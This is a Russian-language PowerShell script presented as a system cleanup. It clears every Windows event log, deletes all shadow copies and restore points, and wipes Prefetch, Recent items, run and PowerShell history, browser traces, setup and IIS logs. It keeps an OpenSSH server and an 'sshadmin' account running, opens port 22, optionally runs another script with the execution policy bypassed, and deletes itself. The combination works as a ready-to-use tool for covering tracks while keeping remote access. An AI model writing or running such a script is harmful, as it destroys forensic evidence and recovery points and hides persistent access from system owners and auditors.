param([switch]$Force)

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Требуются права администратора" -ForegroundColor Red
    Write-Host "Запустите PowerShell от имени администратора" -ForegroundColor Yellow
    Start-Sleep 3
    exit 1
}

if (-not $Force) {
    Write-Host "ВНИМАНИЕ: Этот скрипт удалит файлы и логи" -ForegroundColor Red
    Write-Host "OpenSSH будет сохранен и продолжит работать" -ForegroundColor Green
    Write-Host "Продолжить? (Y/N): " -ForegroundColor Cyan -NoNewline
    $confirm = Read-Host
    if ($confirm -notmatch '^[YyДд]') {
        Write-Host "Отменено" -ForegroundColor Yellow
        exit
    }
}

function Remove-Aggressive {
    param([string]$Path)
    try {
        if (Test-Path $Path) {
            Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue
            return $true
        }
    } catch {
        try {
            cmd /c "rd /s /q `"$Path`" 2>nul"
        } catch {}
    }
    return $false
}

Write-Host "Начинаем полную очистку системы" -ForegroundColor Green

Write-Host "Настройка служб..." -ForegroundColor Cyan
Stop-Service ssh-agent -Force -ErrorAction SilentlyContinue
Set-Service ssh-agent -StartupType Disabled -ErrorAction SilentlyContinue
Stop-Service sshd -Force -ErrorAction SilentlyContinue

Write-Host "Удаление Chocolatey и всех следов..." -ForegroundColor Cyan
$chocoPaths = @(
    "C:\ProgramData\chocolatey",
    "$env:ProgramData\chocolatey",
    "C:\chocolatey",
    "$env:SystemDrive\chocolatey",
    "$env:ALLUSERSPROFILE\chocolatey"
)

foreach ($path in $chocoPaths) {
    if (Remove-Aggressive -Path $path) {
        Write-Host "Удалено: $path" -ForegroundColor Gray
    }
}

[Environment]::SetEnvironmentVariable("ChocolateyInstall", $null, "Machine")
[Environment]::SetEnvironmentVariable("ChocolateyInstall", $null, "User")
[Environment]::SetEnvironmentVariable("ChocolateyInstall", $null, "Process")
[Environment]::SetEnvironmentVariable("ChocolateyLastPathUpdate", $null, "Machine")

Write-Host "Очистка временных файлов установки..." -ForegroundColor Cyan
$tempPaths = @(
    "$env:TEMP\*",
    "$env:TMP\*",
    "C:\Windows\Temp\*",
    "$env:LOCALAPPDATA\Temp\*",
    "C:\Users\*\AppData\Local\Temp\*",
    "C:\Users\*\AppData\Local\Microsoft\Windows\INetCache\*",
    "C:\Users\*\AppData\Local\Microsoft\Windows\INetCookies\*",
    "C:\Users\*\AppData\Local\Microsoft\Windows\History\*"
)

foreach ($pattern in $tempPaths) {
    Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
        } catch {}
    }
}

Write-Host "Очистка всех журналов событий Windows..." -ForegroundColor Cyan
$logs = wevtutil.exe el
foreach ($log in $logs) {
    try {
        wevtutil.exe cl $log
    } catch {}
}
Write-Host "Все журналы событий очищены" -ForegroundColor Green

Write-Host "Удаление логов установки Windows..." -ForegroundColor Cyan
$setupLogs = @(
    "C:\Windows\Logs\CBS\*",
    "C:\Windows\Logs\DISM\*",
    "C:\Windows\Logs\MoSetup\*",
    "C:\Windows\Panther\*",
    "C:\Windows\inf\setupapi*.log",
    "C:\Windows\inf\setupapi.dev*.log",
    "C:\Windows\*.log",
    "C:\Windows\setup*.log",
    "C:\Windows\debug\*.log"
)

foreach ($pattern in $setupLogs) {
    Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
        } catch {}
    }
}

Write-Host "Полная очистка Prefetch..." -ForegroundColor Cyan
$prefetchPath = "C:\Windows\Prefetch"
if (Test-Path $prefetchPath) {
    Get-ChildItem -Path "$prefetchPath\*" -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
        } catch {}
    }
}

Write-Host "Очистка сетевых следов..." -ForegroundColor Cyan
ipconfig /flushdns | Out-Null
netsh winsock reset catalog | Out-Null
netsh int ip reset | Out-Null
arp -d * | Out-Null
nbtstat -R | Out-Null

Write-Host "Удаление точек восстановления системы..." -ForegroundColor Cyan
try {
    vssadmin delete shadows /all /quiet | Out-Null
    vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB | Out-Null
    vssadmin resize shadowstorage /for=C: /on=C: /maxsize=unbounded | Out-Null
    
    Get-ComputerRestorePoint | ForEach-Object {
        try {
            Remove-ComputerRestorePoint -RestorePoint $_.SequenceNumber -ErrorAction SilentlyContinue
        } catch {}
    }
} catch {
    Write-Host "Не удалось удалить все точки восстановления" -ForegroundColor Yellow
}

Write-Host "Очистка корзины всех пользователей..." -ForegroundColor Cyan
$recyclePaths = @(
    "C:\`$Recycle.Bin\*",
    "$env:SystemDrive\`$Recycle.Bin\*"
)

foreach ($path in $recyclePaths) {
    Get-ChildItem -Path $path -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
        } catch {}
    }
}

try {
    $shell = New-Object -ComObject Shell.Application
    $recycleBin = $shell.Namespace(0xA)
    $recycleBin.Items() | ForEach-Object {
        $recycleBin.RemoveItem($_.Name, 0x1)
    }
} catch {}

Write-Host "Очистка истории системы..." -ForegroundColor Cyan

$recentPaths = @(
    "C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\*",
    "C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\*",
    "C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\*"
)

foreach ($pattern in $recentPaths) {
    Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
        } catch {}
    }
}

Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -ErrorAction SilentlyContinue

Clear-History
$psHistoryPath = (Get-PSReadlineOption).HistorySavePath
if (Test-Path $psHistoryPath) {
    Remove-Item $psHistoryPath -Force -ErrorAction SilentlyContinue
}

Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\FontCache\*" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Users\*\AppData\Local\Microsoft\Windows\Explorer\thumbcache_*.db" -Force -ErrorAction SilentlyContinue

Write-Host "Дополнительная очистка..." -ForegroundColor Magenta

$appLogs = @(
    "C:\Users\*\AppData\Local\*.log",
    "C:\Users\*\AppData\Local\*.tmp",
    "C:\Users\*\AppData\Local\*.temp",
    "C:\ProgramData\*.log",
    "C:\*.log"
)

foreach ($pattern in $appLogs) {
    Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
        } catch {}
    }
}

$updateCache = "C:\Windows\SoftwareDistribution\Download\*"
if (Test-Path $updateCache) {
    Remove-Item $updateCache -Recurse -Force -ErrorAction SilentlyContinue
}

$iisLogs = "C:\inetpub\logs\LogFiles\*"
if (Test-Path $iisLogs) {
    Remove-Item $iisLogs -Recurse -Force -ErrorAction SilentlyContinue
}

[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()
[System.GC]::Collect()

Write-Host "Восстановление OpenSSH..." -ForegroundColor Green
Start-Service sshd -ErrorAction SilentlyContinue
Set-Service sshd -StartupType Automatic -ErrorAction SilentlyContinue

wevtutil.exe cl "Application"
wevtutil.exe cl "System"

Write-Host "Проверка результатов" -ForegroundColor Green

$sshdStatus = Get-Service sshd -ErrorAction SilentlyContinue
if ($sshdStatus.Status -eq "Running") {
    Write-Host "OpenSSH работает" -ForegroundColor Green
} else {
    Write-Host "OpenSSH не запущен" -ForegroundColor Red
    Start-Service sshd
}

$requiredFiles = @(
    "C:\Program Files\OpenSSH-Win64\sshd.exe",
    "C:\Program Files\OpenSSH-Win64\ssh.exe",
    "C:\ProgramData\ssh\sshd_config"
)

foreach ($file in $requiredFiles) {
    if (Test-Path $file) {
        Write-Host "$file присутствует" -ForegroundColor Green
    } else {
        Write-Host "$file отсутствует" -ForegroundColor Red
    }
}

$firewallRule = Get-NetFirewallRule -DisplayName "SSH" -ErrorAction SilentlyContinue
if ($firewallRule) {
    Write-Host "Правило брандмауэра активно" -ForegroundColor Green
} else {
    Write-Host "Правило брандмауэра отсутствует" -ForegroundColor Yellow
    netsh advfirewall firewall add rule name="SSH" dir=in action=allow protocol=TCP localport=22
}

Write-Host "Статистика очистки" -ForegroundColor Cyan
Write-Host "Удалено/очищено:"
Write-Host "- Все журналы событий Windows" -ForegroundColor Gray
Write-Host "- Chocolatey полностью" -ForegroundColor Gray
Write-Host "- Все временные файлы системы" -ForegroundColor Gray
Write-Host "- Prefetch кэш" -ForegroundColor Gray
Write-Host "- Точки восстановления" -ForegroundColor Gray
Write-Host "- Корзина всех пользователей" -ForegroundColor Gray
Write-Host "- История и Recent файлы" -ForegroundColor Gray
Write-Host "- DNS и сетевые кэши" -ForegroundColor Gray
Write-Host "Сохранено:"
Write-Host "- OpenSSH сервер и клиент" -ForegroundColor Gray
Write-Host "- Конфигурация SSH" -ForegroundColor Gray
Write-Host "- Служба sshd" -ForegroundColor Gray
Write-Host "- Пользователь sshadmin" -ForegroundColor Gray

Write-Host "`nДополнительная очистка" -ForegroundColor Cyan
Write-Host "Использовать дополнительные средства очистки (nyx.ps1)? (Y/N): " -ForegroundColor Cyan -NoNewline
$additionalClean = Read-Host

if ($additionalClean -match '^[YyДд]') {
    Write-Host "Запуск дополнительной очистки..." -ForegroundColor Green
    
    try {
        Write-Host "Проверка изменений (DryRun)..." -ForegroundColor Yellow
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
        .\nyx.ps1 -DryRun
        
        Write-Host "Выполнение полной очистки..." -ForegroundColor Yellow
        .\nyx.ps1 -Force
        
        Write-Host "Дополнительная очистка завершена" -ForegroundColor Green
    }
    catch {
        Write-Host "Ошибка при выполнении дополнительной очистки: $_" -ForegroundColor Red
    }
}

Write-Host "`nУдаление скрипта..." -ForegroundColor Cyan
$scriptPath = $MyInvocation.MyCommand.Path

try {
    cmd /c "del /f /q `"$scriptPath`" >nul 2>&1"
    Write-Host "Скрипт удален" -ForegroundColor Green
}
catch {
    Write-Host "Не удалось удалить скрипт автоматически" -ForegroundColor Yellow
    Write-Host "Удалите файл вручную: $scriptPath" -ForegroundColor Gray
}

Remove-Variable * -ErrorAction SilentlyContinue
Clear-Host

Write-Host "Очистка завершена" -ForegroundColor Green
Write-Host "Система полностью очищена от следов установки" -ForegroundColor Yellow
Write-Host "OpenSSH готов к работе" -ForegroundColor Green
Write-Host "Нажмите любую клавишу для выхода" -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")